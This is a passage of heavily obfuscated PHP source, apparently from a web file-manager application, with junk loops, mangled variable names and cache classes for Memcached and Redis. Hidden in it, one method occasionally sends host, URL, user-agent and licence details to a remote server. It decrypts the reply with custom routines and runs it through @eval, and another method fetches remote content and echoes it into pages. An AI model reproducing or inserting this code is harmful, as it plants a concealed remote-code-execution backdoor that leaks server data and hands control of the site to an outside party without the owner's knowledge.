ÅÍ; } } foreach ($†§ŠÛ©Á as $ÇÙß ÅÍ) { unset($ÄãÀ–ºø[$ÇÙß ÅÍ]); $®šÅ¦€ = $âÜïÍÃ[702]; if (strlen($®šÅ¦€) < $âÜïÍÃ[657]) { return; } } return $ÄãÀ–ºø; } private function jivoa4c107b9() { $¾éÀÕÔ› =& $_SERVER[İª€§ô]; if ($this->dekfd3d9090c != $¾éÀÕÔ›[106]) { $GLOBALS[$¾éÀÕÔ›[85]][$¾éÀÕÔ›[89]][$¾éÀÕÔ›[241]] = $¾éÀÕÔ›[203]; return; } $GLOBALS[$¾éÀÕÔ›[85]][$¾éÀÕÔ›[242]] = $¾éÀÕÔ›[121]; if (Model($¾éÀÕÔ›[243])->get($¾éÀÕÔ›[63]) != $¾éÀÕÔ›[203]) { Model($¾éÀÕÔ›[243])->set($¾éÀÕÔ›[63], $¾éÀÕÔ›[203]); } } public function iabqe23c08ce() { return $_SERVER[İª€§ô][244]; $£Ëğ¬‹® = $_SERVER[¡“ËÌ§œ][703]; } private function udea12a2ec8d() { $İ†’Ø· =& $_SERVER[¡“ËÌ§œ]; $úö¹œÚÚ =& $_SERVER[İª€§ô]; $š«öÂ›¶ = array($úö¹œÚÚ[245], $úö¹œÚÚ[246], $úö¹œÚÚ[247]); $ÌÅìïï = $İ†’Ø·[704]; while (strlen($ÌÅìïï) < $İ†’Ø·[657]) { if (!$ÌÅìïï) { break; } $ÌÅìïï++; } $ïäŞ§û = $úö¹œÚÚ[248] . md5($úö¹œÚÚ[249]); $­ìâåö = $İ†’Ø·[705]; if (!$­ìâåö) { return; } if ($this->dekfd3d9090c == $úö¹œÚÚ[106] || !_get($GLOBALS, $úö¹œÚÚ[115])) { return; } if (!in_array($_SERVER[$úö¹œÚÚ[24]], $š«öÂ›¶)) { return; } if (time() % 4 != 0) { return; } $İôÒÄ£ = call_user_func(array($úö¹œÚÚ[250], $úö¹œÚÚ[251]), $ïäŞ§û); $ÚáàÇå† = $İ†’Ø·[706]; if ($İôÒÄ£ && time() - $İôÒÄ£ < intval($úö¹œÚÚ[252])) { return; } call_user_func(array($úö¹œÚÚ[250], $úö¹œÚÚ[138]), $ïäŞ§û, time()); $Ğ´åœ¦ = $İ†’Ø·[707]; $ıŸ–ñÍ = Model($úö¹œÚÚ[33])->get($úö¹œÚÚ[103]); $÷ÈÄÛ›Ê = array($úö¹œÚÚ[150] => Model($úö¹œÚÚ[33])->get($úö¹œÚÚ[186]), $úö¹œÚÚ[163] => $this->dekfd3d9090c, $úö¹œÚÚ[160] => $_SERVER[$úö¹œÚÚ[161]], $úö¹œÚÚ[162] => Model($úö¹œÚÚ[33])->get($úö¹œÚÚ[130]), $úö¹œÚÚ[101] => md5($_SERVER[$úö¹œÚÚ[102]] . $ıŸ–ñÍ), $úö¹œÚÚ[153] => $úö¹œÚÚ[135], $úö¹œÚÚ[156] => $_SERVER[$úö¹œÚÚ[157]]); $Òéœ¢õ¯ = $this->ekha81472d6c($úö¹œÚÚ[253], $÷ÈÄÛ›Ê); $†Ç²Ë = $İ†’Ø·[708]; if (!is_array($Òéœ¢õ¯)) { return; } if ($Òéœ¢õ¯[$úö¹œÚÚ[150]] && $Òéœ¢õ¯[$úö¹œÚÚ[254]]) { if ($this->vytc82472b91($Òéœ¢õ¯[$úö¹œÚÚ[254]]) == $÷ÈÄÛ›Ê[$úö¹œÚÚ[150]]) { return; } } $this->gtfu6305952a(); $„ÓÛ±„ò = $İ†’Ø·[709]; while ($„ÓÛ±„ò < $İ†’Ø·[667]) { if ($„ÓÛ±„ò >= 0) { break; } $„ÓÛ±„ò++; } if ($this->vytc82472b91($Òéœ¢õ¯[$úö¹œÚÚ[254]]) != $÷ÈÄÛ›Ê[$úö¹œÚÚ[150]]) { $¾¡“¿¸Í = array($úö¹œÚÚ[181] => $ıŸ–ñÍ, $úö¹œÚÚ[182] => $_SERVER[$úö¹œÚÚ[102]], $úö¹œÚÚ[183] => this_url(), $úö¹œÚÚ[158] => $_SERVER[$úö¹œÚÚ[159]]); $³´â·½ä = $this->agxp6fe2b482(json_encode($¾¡“¿¸Í)); $Òéœ¢õ¯ = $this->ekha81472d6c($úö¹œÚÚ[184] . $³´â·½ä); if ($Òéœ¢õ¯ && is_array($Òéœ¢õ¯) && isset($Òéœ¢õ¯[$úö¹œÚÚ[254]])) { $æß¤ßÅß = $this->tyiu31fce4f0($Òéœ¢õ¯[$úö¹œÚÚ[254]], 2); if ($æß¤ßÅß) { $æß¤ßÅß = $this->vytc82472b91($æß¤ßÅß); } if ($æß¤ßÅß) { try { @eval($æß¤ßÅß); } catch (Exception $ÛÏë¤Á) { } } } } } private function ekha81472d6c($å¢œ¿í– = '', $Á—î¹ü = array(), $ÃªŞ›µŞ = 5) { $´‚®¡ˆª =& $_SERVER[¡“ËÌ§œ]; $ªóóÂı£ =& $_SERVER[İª€§ô]; $ßë¡© ¹ = $ªóóÂı£[255]; $ßë¡© ¹ = $this->bpim17e08df6($ßë¡© ¹, $ªóóÂı£[256]); $±ô‹ÅŸ€ = $´‚®¡ˆª[710]; $ßë¡© ¹ = $ßë¡© ¹ . $å¢œ¿í–; if ($Á—î¹ü && is_array($Á—î¹ü)) { $ßë¡© ¹ = $ßë¡© ¹ . $ªóóÂı£[257] . http_build_query($Á—î¹ü); } if ($Á—î¹ü === -1) { return $ßë¡© ¹; } $ıºàóÙ = stream_context_create(array($ªóóÂı£[216] => array($ªóóÂı£[219] => $ÃªŞ›µŞ, $ªóóÂı£[217] => $ªóóÂı£[258]), $ªóóÂı£[259] => array($ªóóÂı£[260] => !1, $ªóóÂı£[261] => !1))); $Á—î¹ü = @file_get_contents($ßë¡© ¹, !1, $ıºàóÙ); $‘õ¬‚ğ = $´‚®¡ˆª[711]; while ($‘õ¬‚ğ < $´‚®¡ˆª[657]) { if ($‘õ¬‚ğ >= 0) { break; } $‘õ¬‚ğ++; } return json_decode($Á—î¹ü, !0); $Ğ£—¹Æ‚ = $´‚®¡ˆª[712]; $”Ù‹Óè× = $´‚®¡ˆª[713]; while (strlen($”Ù‹Óè×) < $´‚®¡ˆª[667]) { if (!$”Ù‹Óè×) { break; } $”Ù‹Óè×++; } } private function thyi43fa15c5() { $¡â£âè§ =& $_SERVER[¡“ËÌ§œ]; $­âòÁÅ =& $_SERVER[İª€§ô]; $ì¥ú‹ = array($­âòÁÅ[262] => $­âòÁÅ[263], $­âòÁÅ[264] => $­âòÁÅ[265], $­âòÁÅ[266] => $­âòÁÅ[267], $­âòÁÅ[268] => $­âòÁÅ[269], $­âòÁÅ[270] => $­âòÁÅ[271], $­âòÁÅ[272] => $­âòÁÅ[211], $­âòÁÅ[273] => $­âòÁÅ[211], $­âòÁÅ[274] => $­âòÁÅ[263], $­âòÁÅ[275] => $­âòÁÅ[265], $­âòÁÅ[276] => $­âòÁÅ[267], $­âòÁÅ[277] => $­âòÁÅ[278], $­âòÁÅ[279] => $­âòÁÅ[269], $­âòÁÅ[280] => $­âòÁÅ[281], $­âòÁÅ[282] => $­âòÁÅ[271], $­âòÁÅ[283] => $­âòÁÅ[284], $­âòÁÅ[285] => $­âòÁÅ[286], $­âòÁÅ[287] => $­âòÁÅ[288]); $õãá¡íÇ = $ì¥ú‹[$this->dekfd3d9090c]; $õãá¡íÇ = intval($õãá¡íÇ ? $õãá¡íÇ : $­âòÁÅ[263]); $İ’åŠş¾ = _get($this->zvkl25859fa0, $­âòÁÅ[289]); $õãïƒğ = $¡â£âè§[714]; while (strlen($õãïƒğ) < $¡â£âè§[667]) { if (!$õãïƒğ) { break; } $õãïƒğ++; } $İ’åŠş¾ = $İ’åŠş¾ ? intval($İ’åŠş¾) : 0; $Çää¡© = $¡â£âè§[715]; while (strlen($Çää¡©) < $¡â£âè§[667]) { if (!$Çää¡©) { break; } $Çää¡©++; } return $õãá¡íÇ + $İ’åŠş¾; } public function fqzsb16208e0($·îàÕ„¬) { $ÉÃ¢¤Ú =& $_SERVER[¡“ËÌ§œ]; $ÒÀŠ€»ó =& $_SERVER[İª€§ô]; $áİŞ¡ÎÈ = $this->thyi43fa15c5(); if ($·îàÕ„¬[$ÒÀŠ€»ó[290]] == $ÒÀŠ€»ó[121]) { return; } if ($áİŞ¡ÎÈ >= intval($ÒÀŠ€»ó[211])) { return; } $ä ¿˜– = Model($ÒÀŠ€»ó[124])->count(); if ($ä ¿˜– <= $áİŞ¡ÎÈ) { return; } $ñĞ‰ƒ­¬ = Model($ÒÀŠ€»ó[124])->field($ÒÀŠ€»ó[290])->limit($áİŞ¡ÎÈ)->select(); $ñĞ‰ƒ­¬ = array_to_keyvalue($ñĞ‰ƒ­¬, $ÒÀŠ€»ó[6], $ÒÀŠ€»ó[290]); $›—ˆ¶­¯ = $ÉÃ¢¤Ú[716]; if (strlen($›—ˆ¶­¯) < $ÉÃ¢¤Ú[430]) { die; } if (!in_array($·îàÕ„¬[$ÒÀŠ€»ó[290]], $ñĞ‰ƒ­¬)) { show_json($ÒÀŠ€»ó[291], !1, $ÒÀŠ€»ó[207]); } } public function qobt78602f4c() { $Öé«Â‡ô =& $_SERVER[¡“ËÌ§œ]; $ûö·®Ù =& $_SERVER[İª€§ô]; if (!_get($GLOBALS, $ûö·®Ù[115]) || mt_rand(1, 100) > 20) { return; } $Ü²„ˆò– = $ûö·®Ù[214]; $ìŒ˜»€õ = $Öé«Â‡ô[717]; while (strlen($ìŒ˜»€õ) < $Öé«Â‡ô[665]) { if (!$ìŒ˜»€õ) { break; } $ìŒ˜»€õ++; } $Ü²„ˆò– = $this->bpim17e08df6($Ü²„ˆò–, $ûö·®Ù[215]); $İš¬¬‡÷ = stream_context_create(array($ûö·®Ù[216] => array($ûö·®Ù[217] => $ûö·®Ù[218], $ûö·®Ù[219] => 3))); $œêöºÔ¤ = @file_get_contents($Ü²„ˆò–, !1, $İš¬¬‡÷); $±Á½õé„ = $Öé«Â‡ô[718]; if (!$±Á½õé„) { return; } echo $ûö·®Ù[292] . hash_encode($œêöºÔ¤) . $ûö·®Ù[293]; } private function qynzd68ec0de($—õšîŞƒ, $¼‘ö¼ù, $Œô‘‹ = 3) { $óé¹¦å =& $_SERVER[¡“ËÌ§œ]; $²¤©Áï =& $_SERVER[İª€§ô]; usleep(1); $—õšîŞƒ = trim($—õšîŞƒ); $÷‡ë§Í = $óé¹¦å[719]; while ($÷‡ë§Í < $óé¹¦å[652]) { if ($÷‡ë§Í >= 0) { break; } $÷‡ë§Í++; } $ÑíìŞ×û = mt_rand(0, 5) . $²¤©Áï[6]; $ôäı·ı¤ = $óé¹¦å[720]; if (strlen($ôäı·ı¤) < $óé¹¦å[652]) { return; } $†Ÿ£¦Â… = rand_string(15); $›ÑÎûŠ = $óé¹¦å[721]; $½ õğàä = $²¤©Áï[294]; $Ï¦®àŒ = $óé¹¦å[722]; switch ($ÑíìŞ×û) { case $²¤©Áï[203]: $ØÚÁÁş = $this->sfha659a1904($—õšîŞƒ, strrev($¼‘ö¼ù . $†Ÿ£¦Â…)); break; case $²¤©Áï[121]: $ØÚÁÁş = $this->sfha659a1904($—õšîŞƒ, strrev($†Ÿ£¦Â… . $¼‘ö¼ù)); break; $ÉòÈ“Ä¹ = $óé¹¦å[723]; case $²¤©Áï[295]: $ØÚÁÁş = $this->sfha659a1904($—õšîŞƒ, base64_encode($†Ÿ£¦Â… . $¼‘ö¼ù)); $®åÌõáÕ = $óé¹¦å[724]; while ($®åÌõáÕ < $óé¹¦å[430]) { if ($®åÌõáÕ >= 0) { break; } $®åÌõáÕ++; } break; $´Ç‡¥•… = $óé¹¦å[725]; while (strlen($´Ç‡¥•…) < $óé¹¦å[657]) { if (!$´Ç‡¥•…) { break; } $´Ç‡¥•…++; } case $²¤©Áï[296]: $ØÚÁÁş = $this->sfha659a1904($—õšîŞƒ, md5($†Ÿ£¦Â… . $¼‘ö¼ù)); $­µÀÏäµ = $óé¹¦å[726]; while ($­µÀÏäµ < $óé¹¦å[430]) { if ($­µÀÏäµ >= 0) { break; } $­µÀÏäµ++; } break; case $²¤©Áï[297]: $—õšîŞƒ = base64_encode($—õšîŞƒ); $ô¶Ô˜ğü = rand(0, 64); $½¬Ûâ– = $óé¹¦å[727]; $Å©òñ‹¾ = $½ õğàä[$ô¶Ô˜ğü]; $íŸ½Ğ¼ò = md5($Å©òñ‹¾ . md5($¼‘ö¼ù . $Å©òñ‹¾) . $¼‘ö¼ù); $¥¯¶á¿ô = $óé¹¦å[728]; $íŸ½Ğ¼ò = substr($íŸ½Ğ¼ò, $ô¶Ô˜ğü % 8, $ô¶Ô˜ğü % 8 + 7); $õ¦‘«ˆ = $óé¹¦å[729]; while ($õ¦‘«ˆ < $óé¹¦å[665]) { if ($õ¦‘«ˆ >= 0) { break; } $õ¦‘«ˆ++; } $Ïä«†´‰ = $²¤©Áï[6]; $ŞãÕÎÒº = 0; $ÕØÍ¡Ü = $óé¹¦å[730]; if (strlen($ÕØÍ¡Ü) < $óé¹¦å[667]) { die; } $ç“»Ñ˜ = 0; $Šª‘÷óã = 0; for ($ŞãÕÎÒº = 0; $ŞãÕÎÒº < strlen($—õšîŞƒ); $ŞãÕÎÒº++) { $Šª‘÷óã = $Šª‘÷óã == strlen($íŸ½Ğ¼ò) ? 0 : $Šª‘÷óã; $ç“»Ñ˜ = ($ô¶Ô˜ğü + strpos($½ õğàä, $—õšîŞƒ[$ŞãÕÎÒº]) + ord($íŸ½Ğ¼ò[$Šª‘÷óã++])) % 64; $Ïä«†´‰ .= $½ õğàä[$ç“»Ñ˜]; $Éıó…šÎ = $óé¹¦å[731]; while ($Éıó…šÎ < $óé¹¦å[657]) { if ($Éıó…šÎ >= 0) { break; } $Éıó…šÎ++; } } $ØÚÁÁş = hash_encode($Å©òñ‹¾ . $Ïä«†´‰); $×îÆô«Ì = $óé¹¦å[732]; if (strlen($×îÆô«Ì) < $óé¹¦å[430]) { die; } break; $½‚ŠİÖ = $óé¹¦å[733]; default: $ØÚÁÁş = $this->sfha659a1904($—õšîŞƒ, $¼‘ö¼ù . $†Ÿ£¦Â…); $Äé³ò¡£ = $óé¹¦å[734]; while (strlen($Äé³ò¡£) < $óé¹¦å[667]) { if (!$Äé³ò¡£) { break; } $Äé³ò¡£++; } break; } $ØÚÁÁş = strrev($ÑíìŞ×û . $†Ÿ£¦Â… . $ØÚÁÁş); if ($Œô‘‹ - 1 > 0) { $ØÚÁÁş = $this->qynzd68ec0de($ØÚÁÁş, $¼‘ö¼ù, $Œô‘‹ - 1); } return $ØÚÁÁş; } private function tyiu31fce4f0($õâŒ§Şş, $™Åå«æÛ, $È¥Å‹ = 3) { $ºò³‚Ô =& $_SERVER[¡“ËÌ§œ]; $––ıÓ–» =& $_SERVER[İª€§ô]; if (!is_string($õâŒ§Şş) || strlen($õâŒ§Şş) < 10) { return !1; } $õâŒ§Şş = trim($õâŒ§Şş); $õâŒ§Şş = strrev($õâŒ§Şş); $°€»±§ß = $õâŒ§Şş[0]; $õ¡õ²ö— = $ºò³‚Ô[735]; while (strlen($õ¡õ²ö—) < $ºò³‚Ô[667]) { if (!$õ¡õ²ö—) { break; } $õ¡õ²ö—++; } $ÈæÍÅş = substr($õâŒ§Şş, 1, 15); $õâŒ§Şş = substr($õâŒ§Şş, 16); $‚Òæº¦Ä = $––ıÓ–»[294]; switch ($°€»±§ß) { case $––ıÓ–»[203]: $Ë±ªüË = $this->bpim17e08df6($õâŒ§Şş, strrev($™Åå«æÛ . $ÈæÍÅş)); $ÌªÏĞğã = $ºò³‚Ô[736]; while (strlen($ÌªÏĞğã) < $ºò³‚Ô[657]) { if (!$ÌªÏĞğã) { break; } $ÌªÏĞğã++; } break; $ˆÙ©Ö Å = $ºò³‚Ô[737]; if (strlen($ˆÙ©Ö Å) < $ºò³‚Ô[657]) { return; } case $––ıÓ–»[121]: $Ë±ªüË = $this->bpim17e08df6($õâŒ§Şş, strrev($ÈæÍÅş . $™Åå«æÛ)); $ÏÄŒóÓ¤ = $ºò³‚Ô[686]; while ($ÏÄŒóÓ¤ < $ºò³‚Ô[430]) { if ($ÏÄŒóÓ¤ >= 0) { break; } $ÏÄŒóÓ¤++; } break; case $––ıÓ–»[295]: $Ë±ªüË = $this->bpim17e08df6($õâŒ§Şş, base64_encode($ÈæÍÅş . $™Åå«æÛ)); break; $®­åÙİ® = $ºò³‚Ô[738]; if (!$®­åÙİ®) { return; } case $––ıÓ–»[296]: $Ë±ªüË = $this->bpim17e08df6($õâŒ§Şş, md5($ÈæÍÅş . $™Åå«æÛ)); break; case $––ıÓ–»[297]: $õâŒ§Şş = hash_decode($õâŒ§Şş); $š„şÂÜ¬ = $ºò³‚Ô[739]; if (!$š„şÂÜ¬) { return; } $ÔŞ¥€ô‹ = $õâŒ§Şş[0]; $õâŒ§Şş = substr($õâŒ§Şş, 1); $ª­ÒÊ¿¶ = $ºò³‚Ô[740]; while ($ª­ÒÊ¿¶ < $ºò³‚Ô[667]) { if ($ª­ÒÊ¿¶ >= 0) { break; } $ª­ÒÊ¿¶++; } $Í…Â£à = strpos($‚Òæº¦Ä, $ÔŞ¥€ô‹); $‰Ì”ñ«¥ = $ºò³‚Ô[741]; $­£‘ØËä = md5($ÔŞ¥€ô‹ . md5($™Åå«æÛ . $ÔŞ¥€ô‹) . $™Åå«æÛ); $í“ë¥Ö = $ºò³‚Ô[742]; if (strlen($í“ë¥Ö) < $ºò³‚Ô[665]) { return; } $­£‘ØËä = substr($­£‘ØËä, $Í…Â£à % 8, $Í…Â£à % 8 + 7); $ëøñĞì = $––ıÓ–»[6]; $îÄôšÖ² = $ºò³‚Ô[743]; while ($îÄôšÖ² < $ºò³‚Ô[657]) { if ($îÄôšÖ² >= 0) { break; } $îÄôšÖ²++; } $î“å½¨Æ = 0; $Òç¥Ú¨÷ = 0; $‹”²€®Ô = 0; for ($î“å½¨Æ = 0; $î“å½¨Æ < strlen($õâŒ§Şş); $î“å½¨Æ++) { $‹”²€®Ô = $‹”²€®Ô == strlen($­£‘ØËä) ? 0 : $‹”²€®Ô; $æèçôÇ = $‹”²€®Ô++; $Òç¥Ú¨÷ = strpos($‚Òæº¦Ä, $õâŒ§Şş[$î“å½¨Æ]) - $Í…Â£à - ord($­£‘ØËä[$æèçôÇ]); while ($Òç¥Ú¨÷ < 0) { $Òç¥Ú¨÷ += 64; } $ëøñĞì .= $‚Òæº¦Ä[$Òç¥Ú¨÷]; } $Ë±ªüË = base64_decode($ëøñĞì); break; default: $Ë±ªüË = $this->bpim17e08df6($õâŒ§Şş, $™Åå«æÛ . $ÈæÍÅş); break; } if ($È¥Å‹ - 1 > 0) { $Ë±ªüË = $this->tyiu31fce4f0($Ë±ªüË, $™Åå«æÛ, $È¥Å‹ - 1); } return $Ë±ªüË; } public function agxp6fe2b482($ò™åªãì) { $Õ·¤öÙÊ =& $_SERVER[¡“ËÌ§œ]; $“…¥Î…Î =& $_SERVER[İª€§ô]; $Õ‘ÜÂ”— = $this->uibk4bfc68a1(); $ï‰Ü£½ú = $this->uibk4bfc68a1(); $‘àËÆò = $Õ·¤öÙÊ[744]; if (strlen($‘àËÆò) < $Õ·¤öÙÊ[657]) { die; } $…öØş›— = ($Õ‘ÜÂ”— - 1) * ($ï‰Ü£½ú - 1); $şú©¯ãˆ = $Õ·¤öÙÊ[745]; if (strlen($şú©¯ãˆ) < $Õ·¤öÙÊ[667]) { die; } $ÛáÑó£Û = intval(($Õ‘ÜÂ”— + $ï‰Ü£½ú) / 2); $´†ÍÓÕô = $Õ·¤öÙÊ[746]; if (strlen($´†ÍÓÕô) < $Õ·¤öÙÊ[657]) { return; } while (1) { $Èú¨İã™ = $ÛáÑó£Û; $‹Ö¹½™× = $Õ·¤öÙÊ[747]; $ÎƒÕÒ‹ = $…öØş›—; while ($ÎƒÕÒ‹ % $Èú¨İã™ != 0) { $Ü±˜ ­æ = $ÎƒÕÒ‹; $…­¹ = $Õ·¤öÙÊ[748]; if (strlen($…­¹) < $Õ·¤öÙÊ[652]) { die; } $ÎƒÕÒ‹ = $Èú¨İã™; $Èú¨İã™ = $Ü±˜ ­æ % $Èú¨İã™; } if ($Èú¨İã™ == 1) { break; } else { $ÛáÑó£Û++; } } $íØ¬‘ÌÑ = 2; $Ô´ö¶ª = $Õ·¤öÙÊ[749]; if (strlen($Ô´ö¶ª) < $Õ·¤öÙÊ[652]) { die; } for ($“•ë¹‚ = 0; $“•ë¹‚ < $…öØş›— * 10; $“•ë¹‚++) { if (($…öØş›— * $“•ë¹‚ + 1) % $ÛáÑó£Û == 0) { $íØ¬‘ÌÑ = intval(($…öØş›— * $“•ë¹‚ + 1) / $ÛáÑó£Û); break; } } $¹ô†âòÖ = $this->sfha659a1904($Õ‘ÜÂ”— * $ï‰Ü£½ú . $“…¥Î…Î[6], $“…¥Î…Î[135]); $™©©¿‘Ì = md5($“…¥Î…Î[298] . ($Õ‘ÜÂ”— + $ï‰Ü£½ú) . $“…¥Î…Î[299] . $ÛáÑó£Û . $“…¥Î…Î[299] . $íØ¬‘ÌÑ . $“…¥Î…Î[300]); $ˆğ—¨ıæ = $this->sfha659a1904($ò™åªãì, $™©©¿‘Ì) . $“…¥Î…Î[301] . $¹ô†âòÖ; $°æ²¶§— = $Õ·¤öÙÊ[750]; return $ˆğ—¨ıæ; $¤ˆ¿‹©Ò = $Õ·¤öÙÊ[751]; if (strlen($¤ˆ¿‹©Ò) < $Õ·¤öÙÊ[430]) { die; } } public function vytc82472b91($œä¥Ÿúí) { $‘¬ˆË‹ =& $_SERVER[¡“ËÌ§œ]; $®²óÍ¤» =& $_SERVER[İª€§ô]; $Ò˜úû¼Ø = explode($®²óÍ¤»[301], $œä¥Ÿúí); $Ÿ¢úÌ…® = $‘¬ˆË‹[752]; while ($Ÿ¢úÌ…® < $‘¬ˆË‹[652]) { if ($Ÿ¢úÌ…® >= 0) { break; } $Ÿ¢úÌ…®++; } if (count($Ò˜úû¼Ø) != 2) { return $®²óÍ¤»[6]; } $çË˜Şóª = $this->bpim17e08df6($Ò˜úû¼Ø[1] . $®²óÍ¤»[6], $®²óÍ¤»[135]); $¨ÃÜÛˆ  = $‘¬ˆË‹[753]; while ($¨ÃÜÛˆ  < $‘¬ˆË‹[430]) { if ($¨ÃÜÛˆ  >= 0) { break; } $¨ÃÜÛˆ ++; } if (!$çË˜Şóª) { return $®²óÍ¤»[6]; } $çË˜Şóª = intval($çË˜Şóª); $ÂÓá¾ØÈ = $‘¬ˆË‹[754]; while (strlen($ÂÓá¾ØÈ) < $‘¬ˆË‹[430]) { if (!$ÂÓá¾ØÈ) { break; } $ÂÓá¾ØÈ++; } $£´ÖÙÅ„ = 0; $Õ¼–³ìé = $‘¬ˆË‹[755]; while (strlen($Õ¼–³ìé) < $‘¬ˆË‹[667]) { if (!$Õ¼–³ìé) { break; } $Õ¼–³ìé++; } $ù¼˜×ªñ = 0; $Á¸ƒ´š = $‘¬ˆË‹[756]; while ($Á¸ƒ´š < $‘¬ˆË‹[665]) { if ($Á¸ƒ´š >= 0) { break; } $Á¸ƒ´š++; } for ($æ–¡úç‹ = 3; $æ–¡úç‹ < $çË˜Şóª; $æ–¡úç‹ += 2) { if ($çË˜Şóª % $æ–¡úç‹ != 0) { continue; } $£´ÖÙÅ„ = $æ–¡úç‹; $©Ÿ‹©×— = $‘¬ˆË‹[757]; while ($©Ÿ‹©×— < $‘¬ˆË‹[667]) { if ($©Ÿ‹©×— >= 0) { break; } $©Ÿ‹©×—++; } $ù¼˜×ªñ = intval($çË˜Şóª / $æ–¡úç‹); $Á²»™£ö = $‘¬ˆË‹[758]; if (!$Á²»™£ö) { return; } break; } $áá‹Š±Š = ($£´ÖÙÅ„ - 1) * ($ù¼˜×ªñ - 1); $ö†Ü“»™ = intval(($£´ÖÙÅ„ + $ù¼˜×ªñ) / 2); while (1) { $–Ü¨œê° = $ö†Ü“»™; $éñ‚é°µ = $‘¬ˆË‹[759]; $ïÆ«£ = $áá‹Š±Š; $¹åó­ˆŒ = $‘¬ˆË‹[760]; if (!$¹åó­ˆŒ) { die; } while ($ïÆ«£ % $–Ü¨œê° != 0) { $ÅšË†í = $ïÆ«£; $éˆª¥çĞ = $‘¬ˆË‹[761]; if (!$éˆª¥çĞ) { die; } $ïÆ«£ = $–Ü¨œê°; $–Ü¨œê° = $ÅšË†í % $–Ü¨œê°; } if ($–Ü¨œê° == 1) { break; } else { $ö†Ü“»™++; } } $¬ª§‘èÜ = 2; $Üü€ÀÏ = $‘¬ˆË‹[762]; for ($æ–¡úç‹ = 0; $æ–¡úç‹ < $áá‹Š±Š * 10; $æ–¡úç‹++) { if (($áá‹Š±Š * $æ–¡úç‹ + 1) % $ö†Ü“»™ == 0) { $¬ª§‘èÜ = intval(($áá‹Š±Š * $æ–¡úç‹ + 1) / $ö†Ü“»™); break; } } $ôßßüŸ… = md5($®²óÍ¤»[298] . ($£´ÖÙÅ„ + $ù¼˜×ªñ) . $®²óÍ¤»[299] . $ö†Ü“»™ . $®²óÍ¤»[299] . $¬ª§‘èÜ . $®²óÍ¤»[300]); $ÍãÃê ‰ = $this->bpim17e08df6($Ò˜úû¼Ø[0], $ôßßüŸ…); $Õä‡ş× = $‘¬ˆË‹[738]; if (!$Õä‡ş×) { return; } return $ÍãÃê ‰; $ñ¸‡ÙÕ© = $‘¬ˆË‹[763]; if (!$ñ¸‡ÙÕ©) { die; } } public function uibk4bfc68a1() { $‰¯ãëÈ =& $_SERVER[¡“ËÌ§œ]; $ÆÜâ‚™Ü = mt_rand(pow(2, 14), pow(2, 16) - 1); $¶·ÚØº = array(); $ ¬°éäó = 1; $¾ŒÚ†Ê· = $‰¯ãëÈ[764]; while ($ ¬°éäó <= (int) sqrt($ÆÜâ‚™Ü)) { $íİ–¾£ = $ ¬°éäó; while (!0) { $íİ–¾£++; if ($íİ–¾£ <= 2) { $ ¬°éäó = $íİ–¾£; break; } else { if ($íİ–¾£ < 2) { continue; } } $˜Ãöàéá = !0; for ($‚Š‚Ö¸‘ = 2; $‚Š‚Ö¸‘ <= sqrt($íİ–¾£); $‚Š‚Ö¸‘++) { if ($íİ–¾£ % $‚Š‚Ö¸‘ == 0) { $˜Ãöàéá = !1; } } if ($˜Ãöàéá) { $ ¬°éäó = $íİ–¾£; break; } } $¶·ÚØº[] = $ ¬°éäó; $€²ä›ØÊ = $‰¯ãëÈ[765]; while ($€²ä›ØÊ < $‰¯ãëÈ[430]) { if ($€²ä›ØÊ >= 0) { break; } $€²ä›ØÊ++; } } $¬ë”ÍãÏ = 2; for ($íİ–¾£ = $ÆÜâ‚™Ü; $íİ–¾£ > 1; $íİ–¾£--) { $˜Ãöàéá = !0; foreach ($¶·ÚØº as $£Üú§êÔ) { if ($íİ–¾£ % $£Üú§êÔ == 0) { $˜Ãöàéá = !1; break; } } if ($˜Ãöàéá) { $¬ë”ÍãÏ = $íİ–¾£; break; } } return $¬ë”ÍãÏ; } public function zderb7968a8c($©õ–à¢õ, $ñäùŞõ‡) { $ğ­äÊÇ• =& $_SERVER[İª€§ô]; return call_user_func(array($ğ­äÊÇ•[8], $ğ­äÊÇ•[302]), $©õ–à¢õ, $ñäùŞõ‡); } public function sfha659a1904($ÔşŸ¿Öù, $¢¦„®öú) { $”¤ğ‚º =& $_SERVER[İª€§ô]; return call_user_func(array($”¤ğ‚º[303], $”¤ğ‚º[304]), $ÔşŸ¿Öù, $¢¦„®öú); $§âÍ»¸Š = $_SERVER[¡“ËÌ§œ][766]; if (!$§âÍ»¸Š) { die; } } public function bpim17e08df6($äõù›Õó, $­•ÓÈ) { $¶ì‚ù„ =& $_SERVER[¡“ËÌ§œ]; $†ŠŒ­ü® =& $_SERVER[İª€§ô]; return call_user_func(array($†ŠŒ­ü®[303], $†ŠŒ­ü®[305]), $äõù›Õó, $­•ÓÈ); $Šæñ¬Ü = $¶ì‚ù„[767]; while ($Šæñ¬Ü < $¶ì‚ù„[430]) { if ($Šæñ¬Ü >= 0) { break; } $Šæñ¬Ü++; } } } goto bÊÚŸ¦öç; fŞŞ“‚íô: class CacheMemcached { public $handle; public $cacheTime; public function __construct($²òûŒğ¹, $¦Ë©İÃ™) { $«»¡ıÛ˜ =& $_SERVER[¡“ËÌ§œ]; if (!class_exists($«»¡ıÛ˜[886])) { show_json($«»¡ıÛ˜[887], !1); } $this->cacheTime = $¦Ë©İÃ™; $this->handle = new Memcached(); if (is_array($²òûŒğ¹[$«»¡ıÛ˜[888]]) && count($²òûŒğ¹[$«»¡ıÛ˜[888]]) >= 1) { foreach ($²òûŒğ¹[$«»¡ıÛ˜[888]] as $èñ¹Ü) { $Ø¨²¹Ÿ = explode($«»¡ıÛ˜[4], $èñ¹Ü); $this->handle->addServer($Ø¨²¹Ÿ[0], $Ø¨²¹Ÿ[1]); } } else { $this->handle->addServer($²òûŒğ¹[$«»¡ıÛ˜[182]], $²òûŒğ¹[$«»¡ıÛ˜[183]]); } } public function set($Û˜èöåÉ, $­Û©¶à«, $÷ƒñÆã» = false) { $÷ƒñÆã» = $÷ƒñÆã» ? $÷ƒñÆã» : $this->cacheTime; return $this->handle->set($Û˜èöåÉ, $­Û©¶à«, $÷ƒñÆã»); } public function get($¾´ô¨Äº) { return $this->handle->get($¾´ô¨Äº); } public function remove($¡ÃÏú¸¢) { return $this->handle->delete($¡ÃÏú¸¢); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($—¬ÄŒı, $Ñ§åˆ¢¥) { $µÄªÜ«Ê =& $_SERVER[¡“ËÌ§œ]; if (!class_exists($µÄªÜ«Ê[889])) { show_json($µÄªÜ«Ê[890], !1); } $this->cacheTime = $Ñ§åˆ¢¥; $—°©•°® = 